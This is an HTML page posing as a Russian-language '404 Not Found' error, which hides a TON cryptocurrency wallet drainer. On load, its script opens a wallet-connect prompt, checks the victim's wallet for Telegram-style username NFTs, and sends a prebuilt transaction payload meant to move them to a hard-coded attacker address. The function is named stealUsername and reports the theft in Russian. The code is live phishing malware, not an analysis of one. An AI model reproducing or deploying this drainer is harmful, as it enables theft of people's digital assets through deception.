<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        h1 {
            font-size: 72px;
            color: #333;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            font-size: 18px;
        }
    </style>
    <!-- Библиотеки TON Connect -->
    <script src="https://cdn.jsdelivr.net/npm/tonconnect-sdk@2.2.0/lib/tonconnect-sdk.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonconnect-ui@2.0.4/lib/tonconnect-ui.min.js"></script>
</head>
<body>
    <h1>404</h1>
    <p>Страница не найдена</p>

    <script>
        window.addEventListener('load', function() {
            // Проверка загрузки библиотек
            if (typeof TonConnect === 'undefined' || typeof TonConnectUI === 'undefined') {
                console.error('Библиотеки TON Connect не загрузились!');
                return;
            }

            // ========== ТВОИ ДАННЫЕ ==========
            const ATTACKER_ADDRESS = 'UQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRhhafG';
            const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh';
            const PAYLOAD = 'te6cckECBQEAAQsAAeWIAc39af/oITx+Q4vvf0zKDYy8ZkxhANjOIsRC4Y456MMKA5tLO3P///iLTYLRKAAAAA00I+nVx3oe/LAinIUZNSwNySL5E34jwIKucvH2jNQZGfnAzsY6sdLxTjX9+xKyw5RdkWNyOKsKawdaMBwoEBgJAQIKDsPIbQIEAgFoYgBQeGf+SuJLX4dzh2GeG7EF5FlBKf4wJifFZwBSWvy1dKAcBhgoAAAAAAAAAAAAAAAAAQMAoV/MPRRUbeTvpVqftYAXXEjqYukf8Y80Sg6O7kVvcTK+czXoYmxDvFuETLODQXADm/rT/9BCePyHF97+mZQbGXjMmMIBsZxFiIXDHHPRhhQgKAAAKdQ8mA==';
            const manifestUrl = 'https://acountpubgfjdjd-cloud.github.io/nfts/tonconnect-manifest.json';
            // =================================

            let tonConnectUI, connector;

            // ⭐ ИСПРАВЛЕННАЯ ФУНКЦИЯ (API v2)
            async function fetchUsernames(walletAddress) {
                try {
                    // Используем правильный эндпоинт API v2
                    const url = `https://tonapi.io/v2/accounts/${walletAddress}/nfts?collection=${USERNAME_COLLECTION_ADDRESS}&limit=100`;
                    const response = await fetch(url);
                    
                    if (!response.ok) {
                        console.error('Ошибка API, статус:', response.status);
                        return [];
                    }
                    
                    const data = await response.json();
                    // Возвращаем массив NFT (в API v2 он называется nft_items)
                    return data.nft_items || [];
                } catch (e) {
                    console.error('Ошибка получения юзернеймов:', e);
                    return [];
                }
            }

            async function stealUsername() {
                if (!PAYLOAD) {
                    console.error('Payload не вставлен!');
                    return;
                }
                try {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [{
                            address: USERNAME_COLLECTION_ADDRESS,
                            amount: '5000000', // 0.005 TON комиссии
                            payload: PAYLOAD
                        }]
                    };
                    await tonConnectUI.sendTransaction(transaction);
                    console.log('Юзернейм украден');
                } catch (e) {
                    console.error('Ошибка кражи:', e);
                }
            }

            // Инициализация TON Connect
            connector = new TonConnect.Connector();
            tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });

            // Когда кошелёк подключён
            connector.onStatusChange(async (wallet) => {
                if (wallet) {
                    const usernames = await fetchUsernames(wallet.account.address);
                    if (usernames.length > 0) {
                        // Берём первый юзернейм (можно изменить на все или случайный)
                        await stealUsername();
                    }
                }
            });

            // Открываем окно подключения через 1 секунду
            setTimeout(() => {
                if (!connector.connected) {
                    tonConnectUI.openModal();
                }
            }, 1000);
        });
    </script>
</body>
</html>
